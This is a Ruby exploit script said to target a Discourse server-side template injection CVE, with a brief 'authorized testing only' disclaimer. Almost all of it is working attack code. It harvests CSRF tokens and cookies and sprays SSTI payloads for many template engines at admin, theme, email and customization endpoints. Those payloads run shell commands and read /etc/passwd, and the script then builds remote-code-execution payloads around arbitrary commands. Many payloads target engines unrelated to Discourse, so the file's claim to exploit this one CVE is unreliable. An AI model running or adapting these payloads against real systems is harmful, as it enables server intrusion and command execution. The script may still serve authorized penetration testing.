#!/usr/bin/env ruby

# CVE-2024-35198: Discourse Server-Side Template Injection (SSTI)
# Severity: High
# CVSS: 8.8
#
# Description:
# High-severity server-side template injection vulnerability in Discourse
# theme customization allowing remote code execution via template injection.
#
# Affected Versions:
# - Discourse < 3.2.2
# - Discourse < 3.3.0.beta3
#
# Author: ibrahimsql
# Date: 2025
# Purpose: Educational and authorized penetration testing only
#
# WARNING: Use only on systems you own or have explicit permission to test!

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'
require 'nokogiri'
require 'digest'

class CVE_2024_35198
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @timeout = options[:timeout] || 15
    @proxy = options[:proxy]
    @user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    @csrf_token = nil
    @session_cookies = {}
    @admin_access = false
    @results = {
      cve: 'CVE-2024-35198',
      vulnerable: false,
      severity: 'High',
      cvss: 8.8,
      details: [],
      payloads: [],
      ssti_evidence: [],
      rce_evidence: []
    }
  end

  def run_exploit
    puts "[*] Exploiting CVE-2024-35198 against #{@target_url}"
    puts "[*] Severity: High (CVSS: 8.8)"
    puts "[*] Description: Server-Side Template Injection (SSTI)"
    puts "-" * 60

    # Get initial CSRF token
    get_csrf_token

    # Test theme customization SSTI
    puts "[*] Testing theme customization SSTI..."
    test_theme_ssti

    # Test email template SSTI
    puts "[*] Testing email template SSTI..."
    test_email_template_ssti

    # Test custom CSS/JS SSTI
    puts "[*] Testing custom CSS/JS SSTI..."
    test_custom_css_js_ssti

    # Test Handlebars template injection
    puts "[*] Testing Handlebars template injection..."
    test_handlebars_injection

    # Test Liquid template injection
    puts "[*] Testing Liquid template injection..."
    test_liquid_injection

    # Test ERB template injection
    puts "[*] Testing ERB template injection..."
    test_erb_injection

    # Verify code execution
    puts "[*] Verifying code execution..."
    verify_code_execution

    # Print summary
    print_summary

    # Save results
    save_results

    @results
  end

  private

  def get_csrf_token
    begin
      uri = URI("#{@target_url}/")
      response = make_request(uri)
      
      if response && response.body
        doc = Nokogiri::HTML(response.body)
        csrf_meta = doc.at_css('meta[name="csrf-token"]')
        @csrf_token = csrf_meta['content'] if csrf_meta
        
        # Extract session cookies
        response.get_fields('set-cookie')&.each do |cookie|
          cookie_parts = cookie.split(';')[0].split('=')
          @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
        end
        
        # Check for admin access
        check_admin_access
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
  end

  def check_admin_access
    begin
      uri = URI("#{@target_url}/admin")
      response = make_request(uri)
      
      if response && response.code.to_i == 200 && response.body.include?('admin-dashboard')
        @admin_access = true
        puts "[+] Admin access detected"
      end
    rescue => e
      puts "[!] Error checking admin access: #{e.message}"
    end
  end

  def test_theme_ssti
    theme_endpoints = [
      '/admin/customize/themes',
      '/admin/customize/themes/new',
      '/admin/customize/css_html',
      '/admin/site_customizations'
    ]

    ssti_payloads = generate_ssti_payloads

    theme_endpoints.each do |endpoint|
      ssti_payloads.each do |payload_data|
        test_theme_endpoint(endpoint, payload_data)
        sleep(0.5)
      end
    end
  end

  def generate_ssti_payloads
    [
      # Handlebars SSTI
      {
        payload: "{{#each this}}{{@key}}: {{this}}{{/each}}",
        description: "Handlebars object enumeration",
        expected: "key:"
      },
      {
        payload: "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}",
        description: "Handlebars RCE via constructor",
        expected: "uid="
      },
      {
        payload: "{{#with 'constructor'}}{{#with ../constructor}}{{#with constructor}}{{#with constructor}}{{constructor('return process')().mainModule.require('child_process').execSync('whoami')}}{{/with}}{{/with}}{{/with}}{{/with}}",
        description: "Handlebars nested constructor RCE",
        expected: "root"
      },
      
      # Liquid SSTI
      {
        payload: "{{ 'id' | system }}",
        description: "Liquid system filter",
        expected: "uid="
      },
      {
        payload: "{% assign cmd = 'id' %}{{ cmd | system }}",
        description: "Liquid assign and system",
        expected: "uid="
      },
      {
        payload: "{{ self.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit() }}",
        description: "Liquid Python object access",
        expected: "error"
      },
      
      # ERB SSTI
      {
        payload: "<%= system('id') %>",
        description: "ERB system command",
        expected: "uid="
      },
      {
        payload: "<%= `whoami` %>",
        description: "ERB backtick execution",
        expected: "root"
      },
      {
        payload: "<%= File.read('/etc/passwd') %>",
        description: "ERB file read",
        expected: "root:"
      },
      
      # Mustache SSTI
      {
        payload: "{{#lambda}}{{system('id')}}{{/lambda}}",
        description: "Mustache lambda execution",
        expected: "uid="
      },
      
      # Twig SSTI
      {
        payload: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
        description: "Twig filter callback",
        expected: "uid="
      },
      {
        payload: "{{['id']|filter('system')}}",
        description: "Twig system filter",
        expected: "uid="
      },
      
      # Smarty SSTI
      {
        payload: "{system('id')}",
        description: "Smarty system function",
        expected: "uid="
      },
      {
        payload: "{php}system('whoami');{/php}",
        description: "Smarty PHP tag",
        expected: "root"
      },
      
      # Velocity SSTI
      {
        payload: "#set($str=$class.forName('java.lang.String'))\n#set($chr=$class.forName('java.lang.Character'))\n#set($ex=$class.forName('java.lang.Runtime').getRuntime().exec('id'))",
        description: "Velocity Java execution",
        expected: "uid="
      },
      
      # Freemarker SSTI
      {
        payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        description: "Freemarker Execute utility",
        expected: "uid="
      },
      
      # Jinja2 SSTI
      {
        payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        description: "Jinja2 config object access",
        expected: "uid="
      },
      {
        payload: "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}",
        description: "Jinja2 MRO traversal",
        expected: "root"
      },
      
      # Generic payloads
      {
        payload: "${7*7}",
        description: "Math expression evaluation",
        expected: "49"
      },
      {
        payload: "#{7*7}",
        description: "Ruby interpolation",
        expected: "49"
      },
      {
        payload: "{{7*7}}",
        description: "Template math expression",
        expected: "49"
      }
    ]
  end

  def test_theme_endpoint(endpoint, payload_data)
    begin
      url = "#{@target_url}#{endpoint}"
      uri = URI(url)
      
      # Test GET request with payload in parameters
      test_get_injection(uri, payload_data)
      
      # Test POST request with payload in body
      test_post_injection(uri, payload_data)
      
    rescue => e
      @results[:details] << "Error testing theme endpoint #{endpoint}: #{e.message}"
    end
  end

  def test_get_injection(uri, payload_data)
    get_params = [
      "template=#{URI.encode_www_form_component(payload_data[:payload])}",
      "content=#{URI.encode_www_form_component(payload_data[:payload])}",
      "css=#{URI.encode_www_form_component(payload_data[:payload])}",
      "html=#{URI.encode_www_form_component(payload_data[:payload])}",
      "js=#{URI.encode_www_form_component(payload_data[:payload])}",
      "theme_field=#{URI.encode_www_form_component(payload_data[:payload])}"
    ]

    get_params.each do |param|
      begin
        test_uri = URI("#{uri}?#{param}")
        response = make_request(test_uri)
        
        if response && detect_ssti_success(response, payload_data)
          @results[:vulnerable] = true
          @results[:details] << "SSTI via GET parameter: #{param}"
          @results[:payloads] << payload_data[:description]
          @results[:ssti_evidence] << {
            endpoint: uri.path,
            method: 'GET',
            parameter: param.split('=')[0],
            payload: payload_data[:payload],
            response: response.body[0..200]
          }
          
          puts "[+] SSTI detected via GET: #{payload_data[:description]}"
        end
        
      rescue => e
        @results[:details] << "Error in GET injection test: #{e.message}"
      end
      
      sleep(0.3)
    end
  end

  def test_post_injection(uri, payload_data)
    post_bodies = [
      # JSON payloads
      {
        'template' => payload_data[:payload],
        'content_type' => 'application/json'
      },
      {
        'theme_field' => {
          'value' => payload_data[:payload]
        },
        'content_type' => 'application/json'
      },
      
      # Form data payloads
      {
        'css' => payload_data[:payload],
        'content_type' => 'application/x-www-form-urlencoded'
      },
      {
        'html' => payload_data[:payload],
        'content_type' => 'application/x-www-form-urlencoded'
      }
    ]

    post_bodies.each do |body_data|
      begin
        content_type = body_data.delete('content_type')
        
        body = case content_type
               when 'application/json'
                 body_data.to_json
               when 'application/x-www-form-urlencoded'
                 URI.encode_www_form(body_data)
               end
        
        headers = {
          'Content-Type' => content_type,
          'X-CSRF-Token' => @csrf_token,
          'X-Requested-With' => 'XMLHttpRequest'
        }
        
        response = make_request(uri, 'POST', body, headers)
        
        if response && detect_ssti_success(response, payload_data)
          @results[:vulnerable] = true
          @results[:details] << "SSTI via POST body: #{content_type}"
          @results[:payloads] << payload_data[:description]
          @results[:ssti_evidence] << {
            endpoint: uri.path,
            method: 'POST',
            content_type: content_type,
            payload: payload_data[:payload],
            response: response.body[0..200]
          }
          
          puts "[+] SSTI detected via POST: #{payload_data[:description]}"
        end
        
      rescue => e
        @results[:details] << "Error in POST injection test: #{e.message}"
      end
      
      sleep(0.3)
    end
  end

  def test_email_template_ssti
    return unless @admin_access
    
    email_endpoints = [
      '/admin/email/templates',
      '/admin/email/preview-digest',
      '/admin/customize/email_templates'
    ]

    email_payloads = [
      {
        payload: "{{user.name}} - {{system('id')}}",
        description: "Email template system command",
        expected: "uid="
      },
      {
        payload: "Hello {{user.name}}\n<%= system('whoami') %>",
        description: "Email ERB injection",
        expected: "root"
      },
      {
        payload: "{{#each users}}{{@root.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}{{/each}}",
        description: "Email Handlebars RCE",
        expected: "uid="
      }
    ]

    email_endpoints.each do |endpoint|
      email_payloads.each do |payload_data|
        test_email_endpoint(endpoint, payload_data)
        sleep(0.5)
      end
    end
  end

  def test_email_endpoint(endpoint, payload_data)
    begin
      url = "#{@target_url}#{endpoint}"
      uri = URI(url)
      
      # Test email template modification
      email_data = {
        'email_template' => {
          'subject' => payload_data[:payload],
          'body' => payload_data[:payload]
        }
      }
      
      headers = {
        'Content-Type' => 'application/json',
        'X-CSRF-Token' => @csrf_token
      }
      
      response = make_request(uri, 'POST', email_data.to_json, headers)
      
      if response && detect_ssti_success(response, payload_data)
        @results[:vulnerable] = true
        @results[:details] << "Email template SSTI: #{endpoint}"
        @results[:payloads] << payload_data[:description]
        
        puts "[+] Email template SSTI: #{payload_data[:description]}"
      end
      
    rescue => e
      @results[:details] << "Error testing email endpoint: #{e.message}"
    end
  end

  def test_custom_css_js_ssti
    return unless @admin_access
    
    customization_endpoints = [
      '/admin/customize/css_html',
      '/admin/site_customizations',
      '/admin/customize/themes/import'
    ]

    css_js_payloads = [
      {
        payload: "/* {{system('id')}} */",
        description: "CSS comment SSTI",
        expected: "uid="
      },
      {
        payload: "// {{system('whoami')}}\nconsole.log('test');",
        description: "JavaScript comment SSTI",
        expected: "root"
      },
      {
        payload: "<style>{{7*7}}</style>",
        description: "Style tag SSTI",
        expected: "49"
      },
      {
        payload: "<script>{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}</script>",
        description: "Script tag SSTI",
        expected: "uid="
      }
    ]

    customization_endpoints.each do |endpoint|
      css_js_payloads.each do |payload_data|
        test_customization_endpoint(endpoint, payload_data)
        sleep(0.5)
      end
    end
  end

  def test_customization_endpoint(endpoint, payload_data)
    begin
      url = "#{@target_url}#{endpoint}"
      uri = URI(url)
      
      customization_data = {
        'site_customization' => {
          'stylesheet' => payload_data[:payload],
          'header' => payload_data[:payload],
          'footer' => payload_data[:payload]
        }
      }
      
      headers = {
        'Content-Type' => 'application/json',
        'X-CSRF-Token' => @csrf_token
      }
      
      response = make_request(uri, 'POST', customization_data.to_json, headers)
      
      if response && detect_ssti_success(response, payload_data)
        @results[:vulnerable] = true
        @results[:details] << "CSS/JS customization SSTI: #{endpoint}"
        @results[:payloads] << payload_data[:description]
        
        puts "[+] CSS/JS SSTI: #{payload_data[:description]}"
      end
      
    rescue => e
      @results[:details] << "Error testing customization endpoint: #{e.message}"
    end
  end

  def test_handlebars_injection
    handlebars_payloads = [
      "{{constructor.constructor('return process')()}}",
      "{{#with 'constructor'}}{{#with ../constructor}}{{constructor('return process')()}}{{/with}}{{/with}}",
      "{{#each this}}{{@key}}{{/each}}",
      "{{lookup this 'constructor'}}",
      "{{#with (lookup this 'constructor')}}{{#with (lookup this 'constructor')}}{{this('return process')()}}{{/with}}{{/with}}"
    ]

    test_template_injection('handlebars', handlebars_payloads)
  end

  def test_liquid_injection
    liquid_payloads = [
      "{{ 'id' | system }}",
      "{% assign cmd = 'whoami' %}{{ cmd | system }}",
      "{{ self.__class__.__mro__[1].__subclasses__() }}",
      "{% for item in (1..10) %}{{ item }}{% endfor %}"
    ]

    test_template_injection('liquid', liquid_payloads)
  end

  def test_erb_injection
    erb_payloads = [
      "<%= system('id') %>",
      "<%= `whoami` %>",
      "<%= File.read('/etc/passwd') %>",
      "<%= Dir.glob('*') %>",
      "<%= eval('2+2') %>"
    ]

    test_template_injection('erb', erb_payloads)
  end

  def test_template_injection(template_type, payloads)
    injection_points = [
      '/admin/customize/themes',
      '/admin/email/templates',
      '/admin/site_customizations'
    ]

    injection_points.each do |endpoint|
      payloads.each do |payload|
        test_specific_template_injection(endpoint, template_type, payload)
        sleep(0.3)
      end
    end
  end

  def test_specific_template_injection(endpoint, template_type, payload)
    begin
      url = "#{@target_url}#{endpoint}"
      uri = URI(url)
      
      template_data = {
        'template_type' => template_type,
        'content' => payload,
        'name' => "test_#{template_type}_#{Random.rand(1000)}"
      }
      
      headers = {
        'Content-Type' => 'application/json',
        'X-CSRF-Token' => @csrf_token
      }
      
      response = make_request(uri, 'POST', template_data.to_json, headers)
      
      if response && detect_template_execution(response, payload)
        @results[:vulnerable] = true
        @results[:details] << "#{template_type.upcase} template injection: #{endpoint}"
        @results[:payloads] << "#{template_type}: #{payload}"
        
        puts "[+] #{template_type.upcase} injection: #{payload[0..50]}..."
      end
      
    rescue => e
      @results[:details] << "Error testing #{template_type} injection: #{e.message}"
    end
  end

  def verify_code_execution
    return unless @results[:ssti_evidence].any?
    
    verification_commands = [
      'id',
      'whoami',
      'pwd',
      'uname -a'
    ]

    @results[:ssti_evidence].each do |evidence|
      verification_commands.each do |cmd|
        test_command_via_ssti(evidence, cmd)
        sleep(0.5)
      end
    end
  end

  def test_command_via_ssti(evidence, command)
    begin
      # Construct payload based on evidence
      payload = construct_rce_payload(evidence[:payload], command)
      
      url = "#{@target_url}#{evidence[:endpoint]}"
      uri = URI(url)
      
      if evidence[:method] == 'GET'
        test_uri = URI("#{url}?#{evidence[:parameter]}=#{URI.encode_www_form_component(payload)}")
        response = make_request(test_uri)
      else
        body_data = { evidence[:parameter] => payload }
        body = evidence[:content_type] == 'application/json' ? body_data.to_json : URI.encode_www_form(body_data)
        
        headers = {
          'Content-Type' => evidence[:content_type],
          'X-CSRF-Token' => @csrf_token
        }
        
        response = make_request(uri, 'POST', body, headers)
      end
      
      if response && detect_command_execution(response, command)
        @results[:rce_evidence] << {
          command: command,
          payload: payload,
          response: response.body[0..200]
        }
        
        puts "[+] RCE confirmed: #{command}"
      end
      
    rescue => e
      @results[:details] << "Error verifying RCE: #{e.message}"
    end
  end

  def construct_rce_payload(original_payload, command)
    # Adapt the original payload to execute the specified command
    case original_payload
    when /system\(['"](.*?)['"]\)/
      original_payload.gsub($1, command)
    when /execSync\(['"](.*?)['"]\)/
      original_payload.gsub($1, command)
    when /`(.*?)`/
      original_payload.gsub($1, command)
    else
      # Default ERB payload
      "<%= system('#{command}') %>"
    end
  end

  # Helper methods
  def detect_ssti_success(response, payload_data)
    return false unless response && response.body
    
    # Check for expected output
    if payload_data[:expected] && response.body.include?(payload_data[:expected])
      return true
    end
    
    # Check for error messages that indicate template processing
    error_indicators = [
      'template error',
      'syntax error',
      'undefined method',
      'compilation error',
      'template compilation',
      'handlebars error',
      'liquid error',
      'erb error'
    ]
    
    error_indicators.any? { |indicator| response.body.downcase.include?(indicator) }
  end

  def detect_template_execution(response, payload)
    return false unless response && response.body
    
    # Check for mathematical expressions
    if payload.include?('7*7') && response.body.include?('49')
      return true
    end
    
    # Check for command execution indicators
    command_indicators = [
      'uid=',
      'gid=',
      'root:',
      '/bin/bash',
      'Linux',
      'Darwin'
    ]
    
    command_indicators.any? { |indicator| response.body.include?(indicator) }
  end

  def detect_command_execution(response, command)
    return false unless response && response.body
    
    case command
    when 'id'
      response.body.include?('uid=') || response.body.include?('gid=')
    when 'whoami'
      response.body.length > 0 && response.body.length < 50 && !response.body.include?('<')
    when 'pwd'
      response.body.include?('/') && response.body.length < 100
    when 'uname -a'
      response.body.include?('Linux') || response.body.include?('Darwin')
    else
      false
    end
  end

  def make_request(uri, method = 'GET', body = nil, headers = {})
    begin
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
      http.read_timeout = @timeout
      
      request = case method.upcase
                when 'GET'
                  Net::HTTP::Get.new(uri.request_uri)
                when 'POST'
                  Net::HTTP::Post.new(uri.request_uri)
                when 'PUT'
                  Net::HTTP::Put.new(uri.request_uri)
                end
      
      request['User-Agent'] = @user_agent
      
      # Add session cookies
      if @session_cookies.any?
        cookie_string = @session_cookies.map { |k, v| "#{k}=#{v}" }.join('; ')
        request['Cookie'] = cookie_string
      end
      
      # Add custom headers
      headers.each { |k, v| request[k] = v }
      
      request.body = body if body
      
      http.request(request)
    rescue => e
      puts "[!] Request error: #{e.message}"
      nil
    end
  end

  def print_summary
    puts "\n" + "=" * 60
    puts "CVE-2024-35198 Exploit Summary"
    puts "=" * 60
    
    if @results[:vulnerable]
      puts "[+] Target is VULNERABLE to CVE-2024-35198"
      puts "[+] SSTI evidence: #{@results[:ssti_evidence].length} items"
      puts "[+] RCE evidence: #{@results[:rce_evidence].length} items"
    else
      puts "[-] Target appears to be patched"
    end
    
    puts "[*] Total tests performed: #{@results[:details].length}"
    puts "[*] Payloads tested: #{@results[:payloads].length}"
  end

  def save_results
    begin
      @results[:scan_time] = Time.now.to_f
      @results[:target] = @target_url
      
      File.write('/tmp/cve_2024_35198_results.json', @results.to_json)
      puts "[*] Results saved to /tmp/cve_2024_35198_results.json"
    rescue => e
      puts "[!] Error saving results: #{e.message}"
    end
  end
end

# Main execution
if __FILE__ == $0
  if ARGV.length < 1
    puts "Usage: #{$0} <target_url> [proxy]"
    puts "Example: #{$0} https://discourse.example.com"
    exit 1
  end
  
  target_url = ARGV[0]
  proxy = ARGV[1] if ARGV.length > 1
  
  options = {}
  options[:proxy] = proxy if proxy
  
  exploit = CVE_2024_35198.new(target_url, options)
  results = exploit.run_exploit
  
  puts "\n[*] Exploit completed. Results:"
  puts results.to_json
end
